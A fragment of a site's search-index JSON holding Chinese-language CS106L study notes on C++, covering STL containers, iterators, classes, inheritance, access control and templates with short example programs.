Extractor","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u5168\u5c40\u51fd\u6570\u91cd\u8f7d\u6765\u81ea\u5b9a\u4e49 Stream Extractor \u7684\u5de5\u4f5c\u6d41\u7a0b\uff0c\u4f8b\u5982\uff1a</p> <pre><code>istream&amp; operator&gt;&gt;(istream&amp; is, T&amp; obj) {\n    // specific code to read obj\n    return is;\n}\nostream&amp; operator&lt;&lt;(ostream&amp; os, const T&amp; obj) {\n    // specific code to write obj\n    return os;\n}\n\ncin &gt;&gt; a &gt;&gt; b &gt;&gt; c; // ((cin &gt;&gt; a) &gt;&gt; b) &gt;&gt; c;\ncout &lt;&lt; a &lt;&lt; b &lt;&lt; c; // ((cout &lt;&lt; a) &lt;&lt; b) &lt;&lt; c;\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u9700\u8981 return\uff1f\u56e0\u4e3a\u8981\u505a\u5230 chaining</p>"},{"location":"Accumulation/CS106L/C%2B%2B/#containers","title":"Containers","text":"<p>Container is an object that allows us to collect other objects together and interact with them in some way.</p> <p>STL \u4e2d\u5305\u542b\u8bb8\u591a\u7c7b\u578b\u7684\u5bb9\u5668\uff1a</p> <ul> <li><code>&lt;array&gt;</code> \u5b9a\u957f\u6570\u7ec4\u5bb9\u5668</li> <li><code>&lt;vector&gt;</code> \u52a8\u6001\u6570\u7ec4\u5bb9\u5668</li> <li><code>&lt;deque&gt;</code> \u53cc\u7aef\u961f\u5217\u5bb9\u5668</li> <li><code>&lt;list&gt;</code> \u53cc\u7aef\u94fe\u8868\u5bb9\u5668</li> <li><code>&lt;forward_list&gt;</code> \u5355\u5411\u94fe\u8868\u5bb9\u5668</li> <li><code>&lt;stack&gt;</code> \u6808\u5bb9\u5668\u9002\u914d\u5668</li> <li><code>&lt;queue&gt;</code> \u961f\u5217\u5bb9\u5668\u9002\u914d\u5668</li> <li><code>&lt;priority_queue&gt;</code> \u4f18\u5148\u961f\u5217\u5bb9\u5668\u9002\u914d\u5668</li> <li><code>&lt;set&gt;</code> \u96c6\u5408\u5bb9\u5668\uff0c\u57fa\u4e8e\u5e73\u8861\u4e8c\u53c9\u6811</li> <li><code>&lt;unordered_set&gt;</code> \u65e0\u5e8f\u96c6\u5408\u5bb9\u5668\uff0c\u57fa\u4e8e\u54c8\u5e0c\u8868</li> <li><code>&lt;map&gt;</code> \u6620\u5c04\u5bb9\u5668\uff08\u952e\u503c\u5bf9\uff09\uff0c\u57fa\u4e8e\u5e73\u8861\u4e8c\u53c9\u6811</li> <li><code>&lt;unordered_map&gt;</code> \u65e0\u5e8f\u6620\u5c04\u5bb9\u5668\uff0c\u57fa\u4e8e\u54c8\u5e0c\u8868</li> </ul> <p></p> <p>\u5176\u4e2d <code>set</code> \u7cfb\u5217\u7684\u8fed\u4ee3\u5668\u53ea\u6709 <code>const</code> \u7248\u672c\uff0c\u5373\u4e0d\u80fd\u7528\u6765\u4fee\u6539\u503c\uff0c\u56e0\u4e3a\u96c6\u5408\u6309\u7167\u5143\u7d20\u7684\u503c\u4f5c\u4e86\u54c8\u5e0c/\u6392\u5e8f\uff0c\u968f\u610f\u4fee\u6539\u4f1a\u7834\u574f\u539f\u672c\u7684\u987a\u5e8f\u3002</p> <p><code>map</code> \u7cfb\u5217\u867d\u7136\u6709 <code>mutable</code> \u8fed\u4ee3\u5668\uff0c\u4f46\u662f\u53ea\u80fd\u7528\u6765\u4fee\u6539 value\uff0c\u5e76\u4e0d\u80fd\u4fee\u6539 key</p> <p>\u6240\u8c13 Random Access Iterator\uff0c\u6307\u7684\u5c31\u662f\u80fd\u591f\u5728\u5e38\u6570\u65f6\u95f4\u5185\u79fb\u52a8\u5230\u4efb\u4e00\u5143\u7d20\uff08\u6307\u9488\u5f62\u5f0f\uff09</p> <p>\u6b64\u5904\u53ea\u5148\u5217\u51fa\u5173\u4e8e <code>&lt;vector&gt;</code> \u7684\u57fa\u672c\u7528\u6cd5\uff0c\u5176\u5b83\u7684\u7528\u5230\u518d\u8bf4\u3002</p> <pre><code>#include &lt;vector&gt;\n#include &lt;iostream&gt;\n\nint main(void) {\n    // create a vector object that holds integers\n    std::vector&lt;int&gt; v0; // empty vector\n    std::vector&lt;int&gt; v1(5); // 5 integers, all initialized to 0\n    std::vector&lt;int&gt; v2(5, 2); // 5 integers, all initialized to 2\n    std::vector&lt;int&gt; v3 = {1, 2, 3, 4, 5}; // 5 integers, initialized to 1, 2, 3, 4, 5\n\n    // use push_back to add elements to the end of the vector\n    v0.push_back(1);\n    v0.push_back(2);\n    std::cout &lt;&lt; v0[1] &lt;&lt; \"\\n\"; // or you can use v0.at(1)\n\n    // use erase to remove elements from the vector\n    v3.erase(v3.begin() + 1); // remove the second element\n\n    // use size() to get the number of elements in the vector\n    int size = v1.size();\n\n    // use iterator to access elements in the vector\n    for (auto it = v3.begin(); it != v3.end(); ++it)\n        std::cout &lt;&lt; *it &lt;&lt; \" \";\n\n    // use range-based for loop to access elements in the vector\n    for (int i : v3)\n        std::cout &lt;&lt; i &lt;&lt; \" \";\n\n    // use clear to remove all elements from the vector\n    v3.clear();\n}\n</code></pre> <p>\u4ee5\u4e0b\u7a0b\u5e8f\u5229\u7528\u5d4c\u5957 vector \u6253\u5370\u4e58\u6cd5\u8868\uff1a</p> <pre><code>#include &lt;vector&gt;\n#include &lt;iostream&gt;\n#include &lt;bits/stdc++.h&gt;\n\nint main(void) {\n    // create a vector object that holds integers\n    std::vector&lt;std::vector&lt;int&gt;&gt; outer;\n\n    for (int i = 1 ; i &lt; 10 ; ++i )\n    {\n        std::vector&lt;int&gt; inner;\n        for (int j = 1 ; j &lt; 10 ; ++j )\n            inner.push_back(i * j);\n        outer.push_back(inner);\n    }\n\n    for (auto row : outer)\n    {\n        for (auto elem : row)\n            // \u8bbe\u7f6e\u5bbd\u5ea6\u4e3a 4 \u4e2a\u5b57\u7b26\u5bf9\u9f50\uff0c\u4f4d\u4e8e &lt;bits/stdc++.h&gt; \u5e93\u4e2d\n            std::cout &lt;&lt; std::setw(4) &lt;&lt; elem;\n        std::cout &lt;&lt; \"\\n\";\n    }\n}\n</code></pre>"},{"location":"Accumulation/CS106L/C%2B%2B/#iterators","title":"Iterators","text":"<p>In STL, each container has its own iterator, which can have different behavior.</p> <p>\u8fed\u4ee3\u5668\u7c7b\u4f3c\u4e8e\u4e00\u79cd\u7279\u6b8a\u7684\u6307\u9488\u3002</p> <ul> <li>Initializing: <code>iter = s.begin();</code></li> <li>Incrementing: <code>++iter;</code></li> <li>Dereferencing: <code>*iter;</code></li> <li>Comparing: <code>iter != s.end();</code></li> </ul> <p>\u8fed\u4ee3\u5668\u6839\u636e\u5305\u542b\u5173\u7cfb RANDOM-ACCESS[BIDIRECTION[FORWARD]] \u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>forward: \u53ea\u80fd\u5bf9\u8fed\u4ee3\u5668\u5bf9\u8c61\u6267\u884c\u9012\u589e\u4e00\u64cd\u4f5c <code>iter++</code></li> <li>bidirection: \u53ef\u4ee5\u9012\u589e\uff0c\u4e5f\u53ef\u4ee5\u9012\u51cf <code>iter--</code></li> <li>random-access: \u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u6539\u53d8\u7684\u503c <code>iter += 5</code><ul> <li>\u4ece\u800c\u652f\u6301\u4e86 <code>iter1 - iter2</code> \u64cd\u4f5c</li> </ul> </li> </ul> <p>C++17 \u65b0\u589e\u4e86 Contiguous Iterator\uff0c\u5b83\u5728 random-access \u57fa\u7840\u4e0a\u8981\u6c42\u903b\u8f91\u76f8\u90bb\u7684\u5143\u7d20\u5728\u5185\u5b58\u4e2d\u7269\u7406\u76f8\u90bb</p> <p>\u6b64\u5904\u518d\u6b21\u628a\u4e0a\u4e00\u8282\u7684\u56fe\u653e\u5728\u8fd9\uff1a</p> <p></p> <p>\u8fed\u4ee3\u5668\u4f7f\u7b97\u6cd5\u66f4\u52a0\u901a\u7528\uff0c\u4f8b\u5982 <code>sort</code> \u51fd\u6570\u652f\u6301\u5bf9\u6570\u7ec4\u3001vector\u7b49\u5bb9\u5668\u8fdb\u884c\u6392\u5e8f</p> <ul> <li><code>sort</code> \u51fd\u6570\u4f20\u5165\u7684\u8fed\u4ee3\u5668\u9700\u8981\u6ee1\u8db3 Random-Access\uff0c\u56e0\u4e3a\u5176\u4e2d\u4f1a\u5305\u542b <code>it1 - it2</code>\uff0c<code>it + n</code> \u7b49\u64cd\u4f5c</li> <li>\u4f46\u662f <code>std::lower_bound</code>\uff0c<code>std::find</code> \u7b49\u51fd\u6570\u4f20\u5165\u7684\u8fed\u4ee3\u5668\u53ea\u8981\u6ee1\u8db3 Forward \u5373\u53ef\uff0c\u4f46\u662f\u5982\u679c\u652f\u6301 Random-Access\uff0c\u5219\u65f6\u95f4\u590d\u6742\u5ea6\u53ef\u4ee5\u4ece \\(O(N)\\) \u964d\u81f3 \\(O(\\log N)\\)</li> </ul> \u53e6\u4e00\u5f20\u56fe <p></p> <pre><code>#include &lt;map&gt;\n#include &lt;iostream&gt;\n\nint main(void) {\n    std::map&lt;int, int&gt; map{{1,6}, {2,8}, {0,3}, {3,9}};\n\n    for (auto iter = map.begin(); iter != map.end(); ++iter) {\n        const auto&amp; [key, value] = *iter;\n        std::cout &lt;&lt; iter-&gt;first &lt;&lt; \" \" &lt;&lt; iter-&gt;second &lt;&lt; std::endl;\n        std::cout &lt;&lt; key &lt;&lt; \" \" &lt;&lt; value &lt;&lt; std::endl;\n    }\n}\n</code></pre> <p>Quote</p> <ul> <li><code>begin();</code> \u8fd4\u56de\u6307\u5411\u5bb9\u5668\u5934\u7684\u8fed\u4ee3\u5668</li> <li><code>cbegin();</code> const begin()</li> <li><code>rbegin();</code> \u53cd\u5411\u8fed\u4ee3\u5668\uff0c\u8fd4\u56de\u6307\u5411\u5bb9\u5668\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u9006\u5e8f\u8fed\u4ee3\u5668</li> </ul>"},{"location":"Accumulation/CS106L/C%2B%2B/#classes","title":"Classes","text":""},{"location":"Accumulation/CS106L/C%2B%2B/#basic","title":"Basic","text":"<p>Classes are user-defined types that allow a user to encapsulate data and functionality using member variables and member functions.</p> <p><code>class</code> \u9ed8\u8ba4\u4e3a <code>private</code>\uff1b<code>struct</code> \u9ed8\u8ba4\u4e3a <code>public</code></p> <p>C++\u5c5e\u4e8e\u9762\u5411\u5bf9\u8c61\u7684\u8bed\u8a00\uff0c\u7c7b\u662f\u5176\u6838\u5fc3\u7279\u6027\uff0c\u901a\u5e38\u79f0\u4e3a\u7528\u6237\u5b9a\u4e49\u7684\u7c7b\u578b\u3002\u5b83\u662f\u4e00\u79cd\u5c01\u88c5\u4e86\u6570\u636e\u548c\u51fd\u6570\u7684\u7ec4\u5408\uff0c\u7c7b\u4e2d\u6570\u636e\u79f0\u4e3a\u6210\u5458\u53d8\u91cf\uff0c\u51fd\u6570\u79f0\u4e3a\u6210\u5458\u51fd\u6570\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f5c\u4e3a\u6a21\u677f\u521b\u5efa\u5177\u6709\u76f8\u540c\u5c5e\u6027\u548c\u884c\u4e3a\u7684\u591a\u4e2a\u5bf9\u8c61\u3002</p> <pre><code>class classname\n{\nAccess specifiers:        // private/public/portected...\n    Data members;         // \u6210\u5458\u53d8\u91cf\n    Member functions() {} // \u65b9\u6cd5\n}; // end of class\n</code></pre> <p>\u4e00\u4e2a class \u7684\u8bbe\u8ba1\u53ef\u4ee5\u5206\u4e3a\u56db\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>Constructor</li> <li>Private member function/varibles</li> <li>Public member function/varibles</li> <li>Destructor</li> </ul> <p>\u5176\u57fa\u672c\u601d\u8def\u662f\u5c06\u58f0\u660e\u548c\u5b9a\u4e49\u653e\u5728 <code>.hpp</code> \u6587\u4ef6\u4e2d\uff0c\u5177\u4f53\u5b9e\u73b0\u653e\u5728 <code>.cpp</code> \u6587\u4ef6\u4e2d\u3002</p> <p>All containers in STL are classes!!!</p> <p>\u5982\u679c\u4f60\u5199\u8fc7 Python \u7684\u8bdd\uff0c\u5e94\u8be5\u4f1a\u77e5\u9053 Python \u4e2d\u7c7b\u65b9\u6cd5\u7684\u5b9a\u4e49\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5e38\u4e3a <code>self</code>\u3002\u5b9e\u9645\u4e0a\uff0cC++ \u4e2d\u975e <code>static</code> \u7684\u6210\u5458\u51fd\u6570\u4e5f\u9690\u5f0f\u5730\u5c06\u81ea\u5df1\u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u4f20\u5165\uff0c\u5373 <code>this</code>\u3002\u4f8b\u5982\uff1a</p> <pre><code>void Point::print();\n// can be regarded as\nvoid Point::print(Point *this);\n\na.print();\n// can be regarded as\nPoint::print(&amp;a);\n</code></pre> <code>::</code> \u79f0\u4e3a Resolver\uff0c\u4e3a\u4f5c\u7528\u57df\u89e3\u6790\u8fd0\u7b97\u7b26 <ul> <li>\u5982\u679c <code>::</code> \u524d\u9762\u4e0d\u52a0\u4e1c\u897f\uff0c\u5219\u663e\u5f0f\u58f0\u660e\u8c03\u7528\u5168\u5c40\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u5bf9\u8c61\u6216\u65b9\u6cd5</li> <li>\u5bf9\u4e8e\u4e00\u4e2a\u547d\u540d\u7a7a\u95f4\u5185\u7684\u5bf9\u8c61\uff0c\u9ed8\u8ba4\u4f18\u5148\u8bbf\u95ee\u5c40\u90e8/\u7c7b\u4f5c\u7528\u57df\u4e2d\u7684\u53d8\u91cf\uff08\u5982\u679c\u5b58\u5728\uff09</li> </ul> <pre><code>void S::f() {\n    ::f();     // \u2705 \u8c03\u7528\u5168\u5c40\u51fd\u6570 f()\n    ::a++;     // \u2705 \u8bbf\u95ee\u5168\u5c40\u53d8\u91cf a\n    a--;       // \u2753\u5982\u679c\u5b58\u5728\uff0c\u5219\u8bbf\u95ee Class Scope \u4e2d\u7684 'a'\n}\n</code></pre> <p><code>static</code> \u6210\u5458\u51fd\u6570\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u975e <code>static</code> \u6210\u5458\uff0c\u5e76\u4e14\u4e0d\u80fd\u4f7f\u7528 <code>this</code></p> <p>\u53e6\u5916\uff0c<code>const</code> \u5bf9\u8c61\u4e0d\u80fd\u8c03\u7528\u975e <code>const</code> \u6210\u5458\u51fd\u6570\uff0c\u5b83\u4eec\u90fd\u9700\u8981\u4fdd\u6301\u81ea\u8eab\u5916\u90e8\u53ef\u89c1\u72b6\u6001\u4e0d\u53d8\uff1a</p> <pre><code>class MyClass {\npublic:\n    void normalFunc() {\n        std::cout &lt;&lt; \"I'm a non-const function\\n\";\n    }\n    void constFunc() const {\n        std::cout &lt;&lt; \"I'm a const function\\n\";\n    }\n};\n\nint main() {\n    const MyClass obj;     // \ud83d\udc48 \u8fd9\u662f\u4e2a const \u5bf9\u8c61\n\n    obj.constFunc();       // \u2705 OK\uff1aconst \u6210\u5458\u51fd\u6570\uff0c\u53ef\u4ee5\u88ab const \u5bf9\u8c61\u8c03\u7528\n    obj.normalFunc();      // \u274c Error\uff1a\u4e0d\u80fd\u5bf9 const \u5bf9\u8c61\u8c03\u7528\u975e const \u6210\u5458\u51fd\u6570\n}\n</code></pre> <p>\u4f46\u662f\u5728\u5173\u952e\u5b57 <code>mutable</code> \u4fee\u9970\u4e0b\uff0c\u6211\u4eec\u5141\u8bb8 <code>const</code> \u6210\u5458\u51fd\u6570\u5728\u4fdd\u8bc1\u5916\u90e8\u53ef\u89c1\u72b6\u6001\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\uff0c\u4fee\u6539\u5185\u90e8\u72b6\u6001\uff1a</p> <pre><code>class S {\n  mutable bool _is_cached = false;\n  mutable int _cache;\npublic:\n  int f() const {\n    if (!_is_cached) {\n      /* some very, very expensive operation */\n      _is_cached = true;\n      _cache = 42;\n    }\n    return _cache;\n  }\n};\n</code></pre>"},{"location":"Accumulation/CS106L/C%2B%2B/#inheritance","title":"Inheritance","text":"<p>\u4f5c\u4e3a\u9762\u5411\u5bf9\u8c61\uff0c\u7c7b\u540c\u6837\u53ef\u4ee5\u7ee7\u627f\u3002 </p> <ul> <li>\u591a\u6001 Polymorphism: Different objects might need to have the same interface</li> <li>\u62d3\u5c55 Extensibility: Inheritance allows you to extend a class by creating a subclass with specific properties</li> </ul> <pre><code>class Shape {\npublic:\n    virtual double area() const = 0;\n    // virtual \u5173\u952e\u5b57\u58f0\u660e\u865a\u51fd\u6570\uff0c\u53ef\u4ee5\u5728\u6d3e\u751f\u7c7b\u4e2d\u8986\u76d6\u91cd\u5199\u3002\n    // = 0 \u8bf4\u660e\u8be5\u51fd\u6570\u4e0d\u4f1a\u4fee\u6539\u7c7b\u7684\u6210\u5458\u53d8\u91cf\uff0c\u8be5\u51fd\u6570\u65e0\u4efb\u4f55\u5b9e\u73b0\uff0c\u662f\u4e00\u4e2a\u7eaf\u865a\u51fd\u6570\uff0c\u8981\u6c42\u6240\u6709\u6d3e\u751f\u7c7b\u90fd\u8981\u91cd\u5199\u8be5\u51fd\u6570\u3002\n};\n\nclass Circle : public Shape {\npublic:\n    // constructor with initialization list\n    Circle(double radius) : _radius(radius) {};\n    // \u7531\u4e8e\u57fa\u7c7b\u865a\u51fd\u6570\u6709\u5173\u952e\u5b57 const, \u6240\u4ee5\u6d3e\u751f\u7c7b\u91cd\u5199\u7684\u51fd\u6570\u4e5f\u8981\u6709 const \u5173\u952e\u5b57\n    double area() const override {\n        return 3.14159 * _radius * _radius;\n    }\n\nprivate:\n    double _radius;\n};\n</code></pre> <p><code>const</code> \u7528\u4e8e\u6210\u5458\u51fd\u6570\u65f6\uff0c\u8868\u660e\u8be5\u51fd\u6570\u4e0d\u4f1a\u4fee\u6539\u4efb\u4f55\u6210\u5458\u53d8\u91cf</p> <p>\u5bf9\u4e8e\u4e0d\u4fee\u6539\u6210\u5458\u53d8\u91cf\u7684\u51fd\u6570\uff0c\u5c3d\u91cf\u90fd\u52a0\u4e0a <code>const</code> \uff0c\u4e14\u5176\u5728 <code>cpp</code> \u4e2d\u7684\u5b9e\u73b0\u4e5f\u8981\u52a0\u4e0a <code>const</code> \uff0c\u5426\u5219\u7f16\u8bd1\u5668\u6709\u65f6\u4f1a\u56e0\u4e3a\u65e0\u6cd5\u786e\u5b9a\u8be5\u51fd\u6570\u662f\u5426\u4f1a\u4fee\u6539\u6210\u5458\u53d8\u91cf\u800c\u62a5\u9519\u3002</p> Specifiers In Same Class In Derived Class Outside Class <code>private</code> \u2705 \u274c \u274c <code>protected</code> \u2705 \u2705 \u274c <code>public</code> \u2705 \u2705 \u2705 <p>\u5176\u4e2d\uff0cDerived Class \u867d\u7136\u53ef\u4ee5\u7ee7\u627f\u5230 <code>private</code> \u4fee\u9970\u7684\u6210\u5458\uff0c\u4f46\u662f\u5e76\u4e0d\u80fd\u5728\u5176\u51fd\u6570\u4e2d\u76f4\u63a5\u8bbf\u95ee\u3002\u5bf9\u6b64\uff0c\u53ef\u4ee5\u5c06\u9700\u8981\u88ab\u8bbf\u95ee\u7684\u6210\u5458\u6539\u4e3a <code>protected</code>\uff0c\u6216\u8005\u5728\u7236\u7c7b\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u516c\u6709\u63a5\u53e3\uff1a</p> <pre><code>class Base {\nprivate:\n    int secret = 42;\npublic:\n    int getSecret() const { return secret; }\n};\n\nclass Derived : public Base {\npublic:\n    void show() {\n        // \u274c \u7f16\u8bd1\u9519\u8bef\uff0cprivate \u65e0\u6cd5\u8bbf\u95ee\n        // std::cout &lt;&lt; secret;\n        // \u2705 OK\uff0c\u901a\u8fc7\u516c\u6709\u63a5\u53e3\u8bbf\u95ee private \u6210\u5458\n        std::cout &lt;&lt; getSecret();\n    }\n};\n</code></pre> <p>\u5177\u4f53\u62a5\u9519\u4fe1\u606f\u4e3a</p> <pre><code>main.cpp: In member function \u2018void Derived::show()\u2019:\nmain.cpp:14:22: error: \u2018int Base::secret\u2019 is private within this context\n   14 |         std::cout &lt;&lt; secret;\n      |                      ^~~~~~\nmain.cpp:5:9: note: declared private here\n    5 |     int secret = 42;\n      |         ^~~~~~\n</code></pre> <p>\u6b64\u5916\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684 inheritance type\uff0c\u57fa\u7c7b <code>A</code> \u4e2d\u7684\u6210\u5458\u5bf9\u5b50\u7c7b <code>B</code> \u7684\u6743\u9650\u8868\u5982\u4e0b\uff1a</p> Inheritance Type pulic in A protected in A private in A <code>: private A</code> private in B private in B not accessible <code>: protected A</code> protected in B protected in B not accessible <code>: public A</code> pulic in B protected in B not accessible <p>\u5047\u5b9a\u6211\u4eec\u6709\u5b50\u7c7b <code>Circle</code> \u548c\u57fa\u7c7b <code>Ellipse</code>\uff0c\u5bf9\u4e8e\u4e0b\u5217\u4ee3\u7801\uff1a</p> <pre><code>Ellipse elly(20f, 40f);\nCircle circ(60f);\nelly = circ;\n</code></pre> <p>\u6b64\u5904\u8c03\u7528\u7684\u662f <code>Ellipse::operator=</code>\uff0c\u56e0\u6b64\u53ea\u6709\u88ab <code>Circle</code> \u7ee7\u627f\u7684\u6570\u636e\u624d\u4f1a\u88ab Copy\uff1b</p> <pre><code>Ellipse* elly = new Ellipse(20f, 40f);\nCircle* circ = new Circle(60f);\nelly = circ;\n</code></pre> <p>\u6b64\u5904\u539f\u59cb\u7684 <code>elly</code> \u5c31\u4e22\u5931\u4e86\uff0c<code>elly</code> \u548c <code>circ</code> \u90fd\u6307\u5411\u4e86\u540c\u4e00\u4e2a <code>Circle</code> \u5bf9\u8c61\u3002\u5982\u679c <code>Ellipse</code> \u4e2d\u8bbe\u7f6e <code>render()</code> \u4e3a <code>virtual</code> \u7684\u8bdd\uff0c\u8c03\u7528 <code>elly-&gt;render();</code> \uff0c\u4f1a\u56e0\u4e3a\u591a\u6001\u8c03\u7528 <code>Circle::render();</code>\u3002</p> <pre><code>void func(Ellipse&amp; elly) { elly.render(); }\n\nCircle circ(60f);\nfunc(circ);\n</code></pre> <p>\u5728\u7ee7\u627f\u4e2d\uff0c\u5f15\u7528\u7684\u6548\u679c\u548c\u6307\u9488\u7c7b\u4f3c\uff0c\u6b64\u5904\u8c03\u7528\u7684\u51fd\u6570\u4ecd\u7136\u662f <code>Circle::render();</code>\u3002</p> <p>\u63a8\u8350\u53bb\u770b\u8865\u5145\u7684Virtual\u90e8\u5206\uff0c\u4e86\u89e3\u7f16\u8bd1\u5668\u662f\u5148\u505a\u9759\u6001\u7684\u91cd\u8f7d\u51b3\u8bae\uff0c\u518d\u505a\u52a8\u6001\u7684\u865a\u51fd\u6570\u7ed1\u5b9a</p> <p>\u5bf9\u4e8e\u8fd4\u56de\u503c\uff0c\u5728 Type Relaxation \u4e0b\uff0c\u5b50\u7c7b\u53ef\u4ee5\u8fd4\u56de Return Type \u7684 Subclass\uff0c\u4f46\u662f\u53ea\u652f\u6301\u6307\u9488\u548c\u5f15\u7528\uff1a</p> \u51fd\u6570\u7b7e\u540d\u7c7b\u578b \u662f\u5426\u652f\u6301\u534f\u53d8\u91cd\u5199 \u6ce8\u610f\u70b9 <code>T* func()</code> \u2705 \u652f\u6301 \u5b50\u7c7b\u53ef\u8fd4\u56de\u66f4\u5177\u4f53\u6307\u9488\u7c7b\u578b <code>T&amp; func()</code> \u2705 \u652f\u6301 \u5b50\u7c7b\u53ef\u8fd4\u56de\u66f4\u5177\u4f53\u5f15\u7528\u7c7b\u578b <code>T func()</code> \u274c \u4e0d\u652f\u6301 \u5b50\u7c7b\u5fc5\u987b\u8fd4\u56de\u5b8c\u5168\u76f8\u540c\u7c7b\u578b\u7684\u503c <pre><code>class Expr {\npublic:\n    virtual Expr* newExpr();\n    virtual Expr&amp; clone();\n    virtual Expr self();     // \u2190 \u8fd4\u56de\u503c\u662f **\u503c\u7c7b\u578b**\n};\n\nclass BinaryExpr : public Expr {\npublic:\n    virtual BinaryExpr* newExpr();   // \u2705 OK: \u8fd4\u56de\u7c7b\u578b\u662f Expr* \u7684\u5b50\u7c7b\u578b\n    virtual BinaryExpr&amp; clone();     // \u2705 OK: \u8fd4\u56de\u7c7b\u578b\u662f Expr&amp; \u7684\u5b50\u7c7b\u578b\n    virtual BinaryExpr self();       // \u274c ERROR!\n};\n</code></pre>"},{"location":"Accumulation/CS106L/C%2B%2B/#template","title":"Template","text":"<p>\u3010Theorem\u3011\u5728\u6709\u51fd\u6570\u91cd\u8f7d\u7684\u65f6\u5019\uff0c\u4f18\u5148\u8003\u8651\u662f\u5426\u6709\u5b8c\u5168\u5339\u914d\u7684\u51fd\u6570\uff0c\u627e\u4e0d\u5230\u518d\u8003\u8651\u6a21\u677f\uff0c\u8fd8\u662f\u627e\u4e0d\u5230\u518d\u8003\u8651\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362\u3002</p> <p>\u6a21\u677f\u662f\u521b\u5efa\u6cdb\u578b\u7c7b\u6216\u51fd\u6570\u7684\u84dd\u56fe\u6216\u516c\u5f0f\u3002\u5e93\u5bb9\u5668\uff0c\u6bd4\u5982\u8fed\u4ee3\u5668\u548c\u7b97\u6cd5\uff0c\u90fd\u662f\u6cdb\u578b\u7f16\u7a0b\u7684\u4f8b\u5b50\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e86\u6a21\u677f\u7684\u6982\u5ff5\uff0c\u4f8b\u5982 <code>vector&lt;int&gt;</code> \u3002\u6a21\u677f\u51fd\u6570\u5728\u4f60\u5bf9\u5176\u5b9e\u4f8b\u5316\u524d\u90fd\u4e0d\u4f1a\u88ab\u7f16\u8bd1\uff0c\u5f53\u4f60\u8c03\u7528\u4e86\u8fd9\u4e2a\u51fd\u6570\u7684\u4e00\u4e2a\u7248\u672c\uff0c\u7f16\u8bd1\u5668\u4f1a\u751f\u6210\u4e00\u4e2a\u4e13\u5c5e\u7684\u7248\u672c\u4ee5\u4f9b\u540e\u7eed\u4f7f\u7528\u3002</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n\ntemplate &lt;typename T&gt; // &lt;typename T=int&gt; =&gt; define a default type\nT const&amp; max(T const&amp; a, T const&amp; b)\n{\n    return a &lt; b ? b : a;\n}\n\n\nint main()\n{\n    int a = 7, b = 42;\n    std::cout &lt;&lt; \"max(a, b): \" &lt;&lt; max(a, b) &lt;&lt; std::endl;\n    // or you can call max&lt;int&gt;(a, b)\n\n    double x = 7.1, y = 42.2;\n    std::cout &lt;&lt; \"max(x, y): \" &lt;&lt; max(x, y) &lt;&lt; std::endl;\n    // or you can call max&lt;double&gt;(x, y)\n\n    // max(a, x); // ERROR!\n\n    return 0;\n}\n</code></pre> Constraints and Concepts in C++20 <pre><code>template &lt;typename T&gt;\nconcept Addaptable = requires(T a, T b) {\n    a + b;\n}; // if a+b can be compile, then `add` work\ntemplate &lt;typename T&gt; requires Addaptable&lt;T&gt;\nT add(T a, T b) {\n    return a + b;\n}\ntemplate &lt;Addaptable T&gt; // this shorthand also OK!\nT add(T a, T b) {\n    return a + b;\n}\n</code></pre> <p>\u540c\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6a21\u677f\u5bf9\u7c7b\u5728\u5b9e\u4f8b\u5316\u65f6\u8fdb\u884c\u6307\u5b9a\uff1a</p> <pre><code>// lec8.hh\ntemplate &lt;typename T&gt; // also &lt;class T&gt;\nclass Container\n{\npublic:\n    Container (T val);\n    T getVal();\n\nprivate:\n    T _val;\n};\n// ====================================\n// lec8.cpp\n#include \"lec8.hh\"\n\ntemplate &lt;typename T&gt; // also &lt;class T&gt;\nContainer&lt;T&gt;::Container(T val) {\n    this-&gt;_val = val;\n}\n\ntemplate &lt;typename T&gt; // also &lt;class T&gt;\nT Container&lt;T&gt;::getVal() {\n    return _val;\n}\n\nint main()\n{\n    Container&lt;int&gt; intContainer(7);\n    Container&lt;std::string&gt; stringContainer(\"Hello, world!\");\n    return 0;\n}\n</code></pre> <p>Template \u4e0d\u5141\u8bb8\u9690\u5f0f\u7684\u5f62\u5f0f\u8f6c\u6362\uff0c\u56e0\u6b64\u8bf7\u786e\u4fdd\u8c03\u7528\u65f6\u53c2\u6570\u7c7b\u578b\u5bf9\u5e94</p> <p>\u9759\u6001\u5bf9\u8c61\u53ea\u80fd\u4f7f\u7528\u9759\u6001\u63a5\u53e3\uff0c\u6240\u4ee5\u5c06\u53d8\u91cf\u6216\u5bf9\u8c61\u4f5c\u4e3a\u5e38\u91cf\u4f20\u5165\u65f6\u9700\u6ce8\u610f\u5176\u5728\u51fd\u6570\u5185\u90e8\u662f\u5426\u8c03\u7528\u4e86\u975e\u9759\u6001\u63a5\u53e3\u3002\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <pre><code>// .hh\nclass arr\n{\npublic:\n    arr(int size);\n    int&amp; findItem(int item);\n    const int&amp; findItem(int item) const;\n\nprivate:\n    std::vector&lt;int&gt; _arr;\n    int _size;\n};\n// ====================================\n// .cpp\nint&amp; arr::findItem(int item)\n{\n    for (auto&amp; elem : _arr)\n        if (elem == item)\n            return elem;\n\n    throw std::out_of_range(\"Item not found\");\n}\n\n// define a const version\nconst int&amp; arr::findItem(int item) const\n{\n    return const_cast&lt;arr&amp;&gt;(*this).findItem(item);\n}\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\uff0ctemplate \u8fd8\u53ef\u7528\u4f5c default argument\uff0c\u4f8b\u5982\uff1a</p> <pre><code>template &lt;class T, int bounds = 100&gt;\nclass FixedVector {\npublic:\n    FixedVector();\n    T&amp; operator[](int);\nprivate:\n    T 